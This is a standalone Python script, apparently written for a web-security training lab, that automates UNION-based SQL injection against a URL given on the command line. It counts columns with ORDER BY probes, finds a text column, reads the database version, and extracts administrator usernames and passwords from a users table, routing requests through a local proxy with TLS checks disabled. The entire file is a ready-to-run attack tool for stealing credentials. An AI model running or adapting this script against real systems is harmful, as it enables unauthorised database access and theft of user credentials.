#!/usr/bin/python3
import requests
import urllib3
from bs4 import BeautifulSoup
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def number_of_columns(url):
    for i in range(1,20):
        payload = "'+order+by+%s+--" % i
        res = requests.get(url + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in res.text:
            return i-1

def text_column(url,num):
    count = 0
    for i in range(1,num+1):
        string = "'sandeep'"
        payload = ["null"] * num_cols
        payload[i-1] = string
        sql_exploite = "'union select "+','.join(payload) + "--"
        res = requests.get(url+sql_exploite, verify=False, proxies=proxies)
        if "sandeep" in res.text:
            print("[-] column %s contain text" % i)
            count += 1
    return count

def finding_version(url, num, count):
    string = "version()"
    payload = ["null"] * num
    payload[count] = string
    # print(payload)
    sql_exploite = "'union select "+','.join(payload)+" --"
    res = requests.get(url+sql_exploite, verify=False,proxies=proxies)
    if "Ubuntu" in res.text:
        print("[-] Found Database version :")
        soup = BeautifulSoup(res.text, "html.parser")
        for i in soup.find_all('th'):
            if "Ubuntu" in i.string:
                th = str(i)[4:-5]
                print(" -> %s " % th)

def findin_cred(url,num,count):
    string = "username ||'-'|| password from users"
    payload = ["null"] * num
    payload[count] = string
    sql_exploite = "'union select "+','.join(payload)+" --"
    res = requests.get(url+sql_exploite, verify=False,proxies=proxies)
    if "administrator" in res.text:
        print("[-] Admin credential found :")
        soup = BeautifulSoup(res.text, "html.parser")
        for i in soup.find_all('th'):
            if "administrator" in i.string:
                th = str(i)[4:-5]
                print(" -> username-password : "+ th)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("Usages: %s <url>" % sys.argv[0])
        print("Example: %s www.example/filter?pets" % sys.argv[0])
        sys.exit(-1)

    print("\n[+] Finding the number of columns.....")
    num_cols = number_of_columns(url)
    print("[-] Number of columns: ", str(num_cols))

    print("\n[+] Finding column containing text......")
    count = text_column(url,num_cols)

    print("\n[+] Finding the DataBase version.....")
    finding_version(url,num_cols, count)

    print("\n[+] Finding Admin credential......")
    findin_cred(url,num_cols,count)
